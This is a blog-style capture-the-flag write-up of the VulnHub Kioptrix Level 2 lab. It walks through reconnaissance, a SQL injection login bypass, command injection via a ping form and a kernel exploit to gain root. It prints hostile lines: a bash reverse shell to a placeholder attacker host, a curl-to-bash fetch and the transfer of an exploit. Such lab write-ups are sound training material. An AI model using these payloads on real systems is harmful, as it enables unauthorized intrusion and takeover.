---
title: "Kioptrix 2"
date: 2024-05-05
draft: false
summary: "Writeup for Kioptrix level 2 of the Kioptrix series challenge on VulnHub."
tags: ["kioptrix", "linux", "command injection", "kernel exploit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/kioptrix2/cover.png"
  caption: "Kioptrix 2 VulnHub Challenge"
  alt: "Kioptrix 2 cover"
platform: "VulnHub"
---

*Kioptrix-2* is the second challenge in the *Kioptrix* series. The object of the game is to acquire root access via any means possible.
<!--more-->
You can download *kioptrix-2* by clicking on the link given below:
- https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

## Recon

I performed a network scan using **nmap** to find the target IP address.

```shell
nmap -sn 192.168.1.0/24
```

After finding the target IP, I launched an **nmap** aggressive scan to find open ports, services running on the ports and additional information about those services.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 111      | rpc         |
| 443      | https       |
| 631      | ipp         |
| 658      | cups        |
| 3306     | mysql       |

![](https://cdn.ziomsec.com/kioptrix2/1.png)
![](https://cdn.ziomsec.com/kioptrix2/2.png)
![](https://cdn.ziomsec.com/kioptrix2/3.png)

> The _unauthorized_ label next to the SQL server indicated that remote login was disabled and hence the server could only be accessed locally.

## Initial Foothold

Since port 80 was open, I visited the web application on my browser and found a login page.

![](https://cdn.ziomsec.com/kioptrix2/4.png)

After trying a few default credentials, I tried performing an SQL injection using some simple payloads. When I entered the below payload in the *username* field, I was able to bypass the entire authentication mechanism.

```
admin' or 1=1#
```

![](https://cdn.ziomsec.com/kioptrix2/5.png)

After logging in, I got access to a page that allowed me **ping** a machine. I entered the IP of my router and got the ping results in another page.

![](https://cdn.ziomsec.com/kioptrix2/6.png)

![](https://cdn.ziomsec.com/kioptrix2/7.png)

The application displayed raw output of the **ping** command. This made me wonder if it was actually executing a system command on the provided input. If it were doing so, I could add another system command and try making it execute that as well.

```
8.8.8.8; ls
```
> `;` is used to execute multiple commands in a single line on linux systems. There are many other ways of executing multiple together.

![](https://cdn.ziomsec.com/kioptrix2/8.png)

The command that I injected got executed and I was able to view the contents present in the directory being used by the application. Hence I used a **bash** reverse shell payload from **revshells** to get a reverse shell from the target on my listener.
 - https://www.revshells.com/

![](https://cdn.ziomsec.com/kioptrix2/9.png)

I then started a netcat listener on my PC using **nc**.

```bash
rlwrap nc -lnvp 443
```

Finally I executed the payload and got reverse shell

```shell
8.8.8.8; bash -i >& /dev/tcp/KALI_IP/PORT 0>&1
```

![](https://cdn.ziomsec.com/kioptrix2/10.png)

I got a shell as a service user.

## Privilege Escalation

### Enumeration

While exploring, I discovered two users, _john_ and _harold_. However, I couldn't access their directories.

![](https://cdn.ziomsec.com/kioptrix2/11.png)

To ease up enumeration, I downloaded the **linux Smart Enumeration** script on the target system and ran it.

```shell
# after downloading lse.sh on local system, start an http server
python3 -m http.server 8080

# run it on the target by piping the output of curl to bash
curl http://KALI:8080/lse.sh | /bin/bash
```

![](https://cdn.ziomsec.com/kioptrix2/12.png)

![](https://cdn.ziomsec.com/kioptrix2/13.png)

I found the following SUID binaries, but unfortunately, they didn't seem exploitable.

![](https://cdn.ziomsec.com/kioptrix2/14.png)

I double-checked my kernel version:

```shell
uname -a
```

![](https://cdn.ziomsec.com/kioptrix2/15.png)

The **lse** script also revealed that the target was running **CentOS**, so I searched for exploits related to it on **Exploit DB**.

```shell
searchsploit 'Centos 2.6.9'
```

![](https://cdn.ziomsec.com/kioptrix2/16.png)

### Exploiting Kernel

I downloaded the exploit and transferred it to the target system.

```shell
# on local system
searchsploit -m 'linux_x86/local/9542.c'
python3 -m http.server 8080

# on target system
wget http://KALI:8080/9542.c
```


![](https://cdn.ziomsec.com/kioptrix2/17.png)

![](https://cdn.ziomsec.com/kioptrix2/18.png)

After downloading it, I compiled it using **gcc** and ran it to get a shell as **root**.

```shell
gcc 9542.c
./a.out
```

![](https://cdn.ziomsec.com/kioptrix2/19.png)

## Closure

Here's how I pwned Kioptrix-2:
- First, I spotted port 80 running on the target.
- Visiting it revealed a login panel.
- I bypassed the authentication mechanism with SQL injection and landed on a page that allowed to perform ping.
- I then exploited a command injection vulnerability and got a reverse shell.
- Finally, a kernel exploit got me root access.

That's it from my side :) Happy Hacking!

---
